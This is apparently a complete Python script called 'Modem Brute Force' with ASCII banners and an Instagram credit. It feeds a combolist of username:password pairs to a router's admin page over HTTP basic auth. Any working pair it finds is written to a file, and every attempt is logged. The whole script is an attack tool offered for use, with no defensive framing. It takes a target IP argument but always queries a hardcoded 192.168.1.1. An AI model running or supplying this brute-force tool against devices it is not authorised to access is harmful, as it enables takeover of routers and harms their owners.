import sys
from os import system
from requests import get
from time import time,sleep
from datetime import datetime
from _thread import start_new_thread
system("color 4&& cls")
print("###############################################################")
print("______  ___  #    _______  _______  ______   _______  _______ #")
print("___   |/  /  #   (       )(  ___  )(  __  \ (  ____ \(       )#")
print("__  /|_/ /   #   | () () || (   ) || (  \  )| (    \/| () () |#")
print("_  /  / /    #   | || || || |   | || |   ) || (__    | || || |#")
print("/_/  /_/     #   | |(_)| || |   | || |   | ||  __)   | |(_)| |#")
print("             #   | |   | || |   | || |   ) || (      | |   | |#")
print("             #   | )   ( || (___) || (__/  )| (____/\| )   ( |#")
print("             #   |/     \|(_______)(______/ (_______/|/     \|#")
print("###############################################################")
print("________     #    ______   _______          _________ _______ #")
print("___  __ )    #   (  ___ \ (  ____ )|\     /|\__   __/(  ____ \#")
print("__  __  |    #   | (   ) )| (    )|| )   ( |   ) (   | (    \/#")
print("_  /_/ /     #   | (__/ / | (____)|| |   | |   | |   | (__    #")
print("/_____/      #   |  __ (  |     __)| |   | |   | |   |  __)   #")
print("             #   | (  \ \ | (\ (   | |   | |   | |   | (      #")
print("             #   | )___) )| ) \ \__| (___) |   | |   | (____/\#")
print("             #   |/ \___/ |/   \__/(_______)   )_(   (_______/#")
print("###############################################################")
print("__________   #    _______  _______  _______  _______  _______ #")
print("___  ____/   #   (  ____ \(  ___  )(  ____ )(  ____ \(  ____ \#")
print("__  /_       #   | (    \/| (   ) || (    )|| (    \/| (    \/#")
print("_  __/       #   | (__    | |   | || (____)|| |      | (__    #")
print("/_/          #   |  __)   | |   | ||     __)| |      |  __)   #")
print("             #   | (      | |   | || (\ (   | |      | (      #")
print("             #   | )      | (___) || ) \ \__| (____/\| (____/\#")
print("             #   |/       (_______)|/   \__/(_______/(_______/#")
print("###############################################################")
sleep(3)
system("color a&& cls")
print('''
#########################################################"
#                                                       #"
#                                                       #"
#     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+         #"
#     |I|n|s|t|a|g|r|a|m|:|S|r|d|r|N|a|g|h|d|i|         #"
#     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+         #"
#                  Modem Brute Force                    #"
#                       (MBF)                           #"
#                                                       #"
#                                                       #"
#########################################################"
''')
def ex():
    sys.exit()
def tryed(up):
    t = open("Tryed.txt","a")
    t.write(("{:<30}|  {:<}".format(up,str(datetime.now())[:19]+"\n")))
    t.close()  
ip = str(sys.argv[1])
try:
    combolist = open(sys.argv[2], 'r').read().splitlines()
except:
    print ("Usage:\npython MBF.py <IP Address> Combolist.txt")
    ex()
time1 = time()
for up in combolist:
    try:
        start_new_thread(tryed,(up,))
        r = get("http://192.168.1.1",auth = (up.split(":")[0],up.split(":")[1]))
        if r.status_code == 200:
            total_time = str(time() - time1)+" Second"
            uspa = ("Username: "+up.split(":")[0]+"\nPassword: "+up.split(":")[1])
            ins = "\nTotal Time: "+total_time+"\n"+"+-"*20+"+"+"\n"+"|I|n|s|t|a|g|r|a|m|:|S|r|d|r|N|a|g|h|d|i|"+"\n"+"+-"*20+"+"
            mes = uspa+"\n"+str(datetime.now())[:19]+ins
            t = open("UsPa.txt","w+")
            t.write(mes)
            t.close()
            print ("\n\n"+mes)
            ex()
        c = "Checked: "+str(datetime.now())[:19]
        print ("{:<30}|  {:<}".format(up,c))
    except Exception as e:
        mes = up+" => Error:\n"+str(datetime.now())[:19]+" | "+str(e)+"\n"+"="*70+"\n"
        print(mes)
        t = open("Error.txt","a")
        t.write(mes)
        t.close()
print ("\nPassword Not Find :(\n"+"Total Time: "+str(time() - time1)+" Second")

